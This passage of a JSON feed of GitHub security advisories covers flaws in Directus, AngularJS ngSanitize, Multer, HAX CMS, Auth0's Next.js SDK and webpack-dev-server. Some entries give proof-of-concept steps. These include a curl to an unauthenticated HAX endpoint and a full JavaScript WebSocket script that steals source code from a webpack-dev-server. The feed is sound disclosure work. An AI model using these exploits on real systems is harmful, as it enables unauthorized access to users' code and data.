href=\"https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771\">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30351\">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g",
            "title": "[@directus/api] Suspended Directus user can continue to use session token to access API",
            "date_modified": "2025-06-09T18:12:10.000Z",
            "date_published": "2025-03-26T18:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>\n<h3 id=\"details\">Details</h3>\n<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create an active user</li>\n<li>Log in with that user and note the session cookie</li>\n<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>\n<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This weakens the security of suspending users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771\">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30351\">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g",
            "title": "[directus] Suspended Directus user can continue to use session token to access API",
            "date_modified": "2025-06-09T18:12:10.000Z",
            "date_published": "2025-03-26T18:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper sanitization of the value of the 'href' and 'xlink:href' attributes in '<img>' SVG elements in AngularJS's&nbsp;'ngSanitize'&nbsp;module allows attackers to bypass common image source restrictions. This can lead to a form of  Content Spoofing <a href=\"https://owasp.org/www-community/attacks/Content_Spoofing\">https://owasp.org/www-community/attacks/Content_Spoofing</a> &nbsp;and also negatively affect the application's performance and behavior by using too large or slow-to-load images.</p>\n<p>This issue affects AngularJS versions greater than or equal to 1.3.1.</p>\n<p>Note:\nThe AngularJS project is End-of-Life and will not receive any updates to address this issue. For more information see  here <a href=\"https://docs.angularjs.org/misc/version-support-status\">https://docs.angularjs.org/misc/version-support-status</a> .</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2336\">https://nvd.nist.gov/vuln/detail/CVE-2025-2336</a></li>\n<li><a href=\"https://codepen.io/herodevs/pen/bNGYaXx/412a3a4218387479898912f60c269c6c\">https://codepen.io/herodevs/pen/bNGYaXx/412a3a4218387479898912f60c269c6c</a></li>\n<li><a href=\"https://www.herodevs.com/vulnerability-directory/cve-2025-2336\">https://www.herodevs.com/vulnerability-directory/cve-2025-2336</a></li>\n<li><a href=\"https://www.herodevs.com/vulnerability-directory/cve-2025-2336?angularjs-nes\">https://www.herodevs.com/vulnerability-directory/cve-2025-2336?angularjs-nes</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4p4w-6hg8-63wx\">https://github.com/advisories/GHSA-4p4w-6hg8-63wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4p4w-6hg8-63wx",
            "title": "[angular-sanitize] AngularJS Incomplete Filtering of Special Elements vulnerability",
            "date_modified": "2025-06-06T23:38:47.000Z",
            "date_published": "2025-06-04T18:30:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4p4w-6hg8-63wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability in Multer versions &gt;=1.4.4-lts.1, &lt;2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to <code>2.0.1</code></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9\">https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9</a>\n<a href=\"https://github.com/expressjs/multer/issues/1233\">https://github.com/expressjs/multer/issues/1233</a>\n<a href=\"https://github.com/expressjs/multer/pull/1256\">https://github.com/expressjs/multer/pull/1256</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg\">https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48997\">https://nvd.nist.gov/vuln/detail/CVE-2025-48997</a></li>\n<li><a href=\"https://github.com/expressjs/multer/issues/1233\">https://github.com/expressjs/multer/issues/1233</a></li>\n<li><a href=\"https://github.com/expressjs/multer/pull/1256\">https://github.com/expressjs/multer/pull/1256</a></li>\n<li><a href=\"https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9\">https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5hg-p3ph-g8qg\">https://github.com/advisories/GHSA-g5hg-p3ph-g8qg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5hg-p3ph-g8qg",
            "title": "[multer] Multer vulnerable to Denial of Service via unhandled exception",
            "date_modified": "2025-06-05T01:09:36.000Z",
            "date_published": "2025-06-05T01:09:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5hg-p3ph-g8qg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An <strong>unauthenticated information disclosure vulnerability</strong> exists in the PSU deployment of HAX CMS via the <code>haxPsuUsage</code> API endpoint. This allows <strong>any remote unauthenticated user</strong> to retrieve a full list of PSU websites hosted on HAX CMS. When chained with other authorization issues (e.g., HAX-3), this could assist in targeted attacks such as unauthorized content modification or deletion.</p>\n<hr>\n<h3 id=\"details\">Details</h3>\n<p>The endpoint <a href=\"https://open-apis.hax.cloud/api/services/stats/haxPsuUsage\"><code>https://open-apis.hax.cloud/api/services/stats/haxPsuUsage</code></a> returns a list of websites on the PSU instance of HAX CMS. This endpoint is exposed without any authentication or authorization checks.</p>\n<p>The source of the issue is in the <code>haxPsuUsage.js</code> file, which appears to directly serve the site listing without verifying user identity or access level. This enables anyone with the endpoint URL to enumerate all site instances under the PSU deployment.</p>\n<p>This endpoint may have originally been used for internal or statistical purposes but is now publicly accessible, representing a privacy and enumeration risk.</p>\n<hr>\n<h3 id=\"poc\">PoC</h3>\n<p>To reproduce this vulnerability:</p>\n<ol>\n<li>Open a terminal or browser.</li>\n<li>Send a GET request to the following endpoint:<pre><code class=\"language-bash\">curl https://open-apis.hax.cloud/api/services/stats/haxPsuUsage\n</code></pre>\n</li>\n</ol>\n<hr>\n<h3 id=\"impact\">Impact</h3>\n<p>The <code>haxPsuUsage</code> endpoint exposes a full list of PSU HAX CMS websites to <strong>any unauthenticated user</strong>, allowing external actors to enumerate all sites under the PSU domain. This alone represents an information disclosure vulnerability.</p>\n<p>When <strong>chained with the Lack Of Authorization Checks CVE</strong>, which involves missing authorization checks on key API endpoints, the risk escalates significantly. An <strong>authenticated attacker</strong> can:</p>\n<ul>\n<li>Modify or delete other users' sites via:<ul>\n<li><code>createNode()</code>, <code>saveNode()</code>, <code>deleteNode()</code></li>\n</ul>\n</li>\n<li>Access sensitive metadata or credentials:<ul>\n<li><code>getConfig()</code>, <code>downloadSite()</code></li>\n</ul>\n</li>\n<li>Clone or remove entire sites:<ul>\n<li><code>cloneSite()</code>, <code>deleteSite()</code>, <code>archiveSite()</code></li>\n</ul>\n</li>\n</ul>\n<p>Combined, these issues allow a low-privileged user to <strong>fully compromise any site</strong> in the PSU HAX CMS instance.</p>\n<p>This vulnerability chain puts <strong>content integrity, availability, and confidentiality</strong> at risk for potentially hundreds of PSU academic, instructional, and departmental sites.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/haxtheweb/issues/security/advisories/GHSA-fvx2-x7ff-fc56\">https://github.com/haxtheweb/issues/security/advisories/GHSA-fvx2-x7ff-fc56</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48996\">https://nvd.nist.gov/vuln/detail/CVE-2025-48996</a></li>\n<li><a href=\"https://github.com/haxtheweb/open-apis/commit/06c2e1fbb7131a8fe66aa0600f38dcacae6b7ac7\">https://github.com/haxtheweb/open-apis/commit/06c2e1fbb7131a8fe66aa0600f38dcacae6b7ac7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fvx2-x7ff-fc56\">https://github.com/advisories/GHSA-fvx2-x7ff-fc56</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fvx2-x7ff-fc56",
            "title": "[@haxtheweb/open-apis] Unauthenticated Disclosure of PSU HAX CMS Site Listings via haxPsuUsage API Endpoint",
            "date_modified": "2025-06-05T01:07:47.000Z",
            "date_published": "2025-06-05T01:07:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fvx2-x7ff-fc56"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Overview</strong>\nIn Auth0 Next.js SDK versions 4.0.1 to 4.6.0, __session cookies set by auth0.middleware may be cached by CDNs due to missing Cache-Control headers.</p>\n<p><strong>Am I Affected?</strong>\nYou are affected by this vulnerability if you meet the following preconditions:</p>\n<ol>\n<li>Applications using the NextJS-Auth0 SDK, versions between 4.0.1 to 4.6.0,</li>\n<li>Applications using CDN or edge caching that caches responses with the Set-Cookie header.</li>\n<li>If the Cache-Control header is not properly set for sensitive responses.</li>\n</ol>\n<p><strong>Fix</strong>\nUpgrade auth0/nextjs-auth0 to v4.6.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-f3fg-mf2q-fj3f\">https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-f3fg-mf2q-fj3f</a></li>\n<li><a href=\"https://github.com/auth0/nextjs-auth0/commit/12a62ca596db3b0827b39a4b865b882423e7cb1e\">https://github.com/auth0/nextjs-auth0/commit/12a62ca596db3b0827b39a4b865b882423e7cb1e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48947\">https://nvd.nist.gov/vuln/detail/CVE-2025-48947</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f3fg-mf2q-fj3f\">https://github.com/advisories/GHSA-f3fg-mf2q-fj3f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f3fg-mf2q-fj3f",
            "title": "[@auth0/nextjs-auth0] NextJS-Auth0 SDK Vulnerable to CDN Caching of Session Cookies",
            "date_modified": "2025-06-04T22:57:22.000Z",
            "date_published": "2025-06-04T21:24:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f3fg-mf2q-fj3f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Source code may be stolen when you access a malicious web site with non-Chromium based browser.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>Origin</code> header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address <code>Origin</code> headers.\n<a href=\"https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\">https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127</a>\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in <a href=\"https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages\">the article</a> linked from CVE-2018-14732, the attacker get the source code.</p>\n<p>related commit: <a href=\"https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb\">https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb</a> (note that <code>checkHost</code> function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.</p>\n<p>This vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to <a href=\"https://developer.chrome.com/blog/private-network-access-update#chrome_94\">the non-HTTPS private access blocking feature</a>.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Download <a href=\"https://github.com/user-attachments/files/18418233/reproduction.zip\">reproduction.zip</a> and extract it</li>\n<li>Run <code>npm i</code></li>\n<li>Run <code>npx webpack-dev-server</code></li>\n<li>Open <code>http://{ipaddress}/?target=http://localhost:8080&amp;file=main</code> with a non-Chromium browser (I used Firefox 134.0.1)</li>\n<li>Edit <code>src/index.js</code> in the extracted directory</li>\n<li>You can see the content of <code>src/index.js</code></li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4\"></p>\n<p>The script in the POC site is:</p>\n<pre><code class=\"language-js\">window.webpackHotUpdate = (...args) =&gt; {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n        console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event =&gt; {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h\">https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30360\">https://nvd.nist.gov/vuln/detail/CVE-2025-30360</a></li>\n<li><a href=\"https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb\">https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb</a></li>\n<li><a href=\"https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239\">https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239</a></li>\n<li><a href=\"https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\">https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9jgg-88mc-972h\">https://github.com/advisories/GHSA-9jgg-88mc-972h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h",
            "title": "[webpack-dev-server] webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
            "date_modified": "2025-06-04T21:09:39.000Z",
            "date_published": "2025-06-04T21:09:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}